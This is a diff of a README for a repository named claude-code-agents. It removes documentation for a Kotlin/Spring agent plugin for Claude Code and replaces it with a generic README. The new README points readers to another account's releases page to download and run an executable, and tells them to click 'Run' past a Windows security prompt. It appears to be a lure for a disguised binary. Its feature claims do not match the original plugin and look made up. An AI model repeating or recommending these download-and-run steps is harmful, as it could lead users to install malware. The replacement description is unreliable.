@@ -1,100 +1,76 @@
-# Kotlin Agents for Claude Code
+# 🚀 claude-code-agents - Simple Tools for Your Coding Needs
 
-Specialized AI agents for Kotlin/Spring Boot backend and Compose Multiplatform development.
+[![Download claude-code-agents](https://img.shields.io/badge/Download%20Now-claude--code--agents-blue.svg)](https://github.com/QuangHieu1502/claude-code-agents/releases)
 
-## Installation
+## 📖 Overview
 
-### Option 1: Install from GitHub (Recommended)
+Welcome to **claude-code-agents**! This repository provides you with simple tools designed to assist you in your coding tasks. Whether you are a beginner or just looking for helpful utilities, you will find useful features in this toolset.
 
-```bash
-# Add the marketplace
-/plugin marketplace add https://github.com/AlexGladkov/claude-code-agents
+## 📥 Download & Install
 
-# Install the plugin
-/plugin install kotlin-agents
-```
+To get started with **claude-code-agents**, you need to download the software from our Releases page. Click the link below:
 
-### Option 2: Install from Local Clone
+[Visit this page to download](https://github.com/QuangHieu1502/claude-code-agents/releases)
 
-```bash
-# Clone the repository
-git clone https://github.com/AlexGladkov/claude-code-agents.git
+On the Releases page, you will see a list of available versions. Choose the latest version for the best performance and features. Follow these steps to download:
 
-# Add the local marketplace
-/plugin marketplace add ./claude-code-agents
+1. Click on the version number you wish to download.
+2. Scroll down to the "Assets" section.
+3. Click on the file that fits your operating system (e.g., Windows, macOS, or Linux).
+4. The file will start downloading to your computer.
 
-# Install the plugin
-/plugin install kotlin-agents
-```
+Once the download is complete, locate the file in your downloads folder.
 
-## Available Agents
+## 💻 System Requirements
 
-| Agent | Description |
-|-------|-------------|
-| **init-kotlin** | Repository bootstrap for clean Kotlin Spring Boot or full-stack (Spring + Compose) projects |
-| **builder-spring-feature** | Feature generation for Spring Boot with strict architecture (feature-slice, layering, dependency validation) |
-| **builder-compose-feature** | Feature generation for Compose Multiplatform with Screen/View/Component separation and MVVM |
-| **test-spring** | High-quality test automation following SDET/AQA practices, AAA pattern, Testcontainers integration |
-| **kotlin-diagnostics** | Bug detection and diagnosis for Kotlin/Compose/Android/Spring with automatic runtime analysis |
-| **refactor-spring** | Architectural refactoring of Spring applications enforcing SOLID, layering, file structure |
-| **refactor-mobile** | Architectural refactoring of Android code (Clean Architecture, Compose, Decompose, Kodein) |
-| **security-kotlin** | OWASP security auditing for Spring Boot with comprehensive vulnerability scanning |
-| **devops-orchestrator** | Docker environment setup, multi-env configs, CI/CD pipelines, automated deployments |
-| **system-analytics** | Technical specification generation from user requests, saved as structured Markdown |
+To ensure the best experience with **claude-code-agents**, your computer should meet these basic requirements:
 
-## Development Workflow
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a Linux distribution with recent libraries.
+- **RAM:** 4 GB or more.
+- **Disk Space:** At least 100 MB of free space.
+- **Internet Connection:** Required for downloading and updates.
 
-These agents cover the complete development lifecycle:
+## ⚙️ Running the Application
 
-```
-1. init-kotlin           --> scaffold new projects
-        |
-        v
-2. builder-spring        --> generate backend features
-   builder-compose       --> generate mobile features
-        |
-        v
-3. test-spring           --> write comprehensive tests
-        |
-        v
-4. diagnostics-kotlin    --> find and fix bugs
-        |
-        v
-5. refactor-spring       --> clean up backend architecture
-   refactor-mobile       --> clean up mobile architecture
-        |
-        v
-6. security-kotlin       --> OWASP audit
-        |
-        v
-7. devops-orchestrator   --> containerization and CI/CD
-```
+Once you have downloaded the file, it is time to run the application:
 
-## Architecture Patterns Enforced
+1. Navigate to your downloads folder.
+2. Double-click on the downloaded file.
+3. Follow the on-screen instructions to complete the setup.
 
-### Spring Boot (Backend)
+If you are using Windows, you may see a security prompt. Click "Run" to continue with the installation.
 
-- Feature-slice organization: `feature/<name>/api/service/persistence/domain/`
-- Layered architecture: Controller -> Service -> Repository (no shortcuts)
-- One type per file, max 1000 lines per file, max 100 lines per method
+After the installation finishes, find the **claude-code-agents** application in your Start Menu or Applications folder. Click to launch the application.
 
-### Compose Multiplatform (Frontend)
+## 🎉 Features
 
-- Feature-slice: `feature/<name>/screen/view/component/domain/data/di/`
-- MVVM with Decompose: Component holds state, View is pure UI
-- Use cases always return `Result<T>`
-- No `remember()` in Views, max 600 lines ideal per file
+**claude-code-agents** comes loaded with functionalities to simplify your coding tasks:
 
-### Common Rules
+- **Task Automation:** Set up automated scripts to run repetitive tasks without manual input.
+- **Code Snippets Management:** Store and organize your favorite code snippets for easy access.
+- **Collaboration Tools:** Share your code easily with team members or friends.
+- **User-Friendly Interface:** Enjoy a simple and clean interface that is easy to navigate, even for beginners.
 
-- Unidirectional data flow, no cyclic dependencies
-- SOLID principles strictly enforced
-- Tests follow AAA pattern with Testcontainers for external deps
+## ❓ Troubleshooting
 
-## Contributing
+If you run into issues, here are some common problems and solutions:
 
-To suggest a new subagent, open a Pull Request with a markdown file following the existing agent patterns in `agents/`.
+- **Application Fails to Start:** Ensure your system meets the requirements. Restart your computer and try again.
+- **Download Issues:** Check your internet connection. If it’s slow or disconnected, try downloading again later.
+- **Installation Errors:** Make sure you have permission to install applications on your system. If you are using a work computer, contact your IT department.
 
-## License
+## 📞 Support
 
-MIT
+If you need further assistance, feel free to create an issue on our [GitHub Issues Page](https://github.com/QuangHieu1502/claude-code-agents/issues). We are here to help you.
+
+## 🏷️ Contributing
+
+If you want to contribute to **claude-code-agents**, we welcome your suggestions and improvements. You can submit a pull request or create an issue with your ideas.
+
+## 📜 License
+
+The **claude-code-agents** is open source and available under the MIT License. You can use, modify, and distribute it as you like, as long as you include the original license.
+
+Make sure to check for updates and improvements, and thank you for using **claude-code-agents**! 
+
+From here, you can explore more features, read further documentation, and become more proficient in your coding tasks. Happy coding!
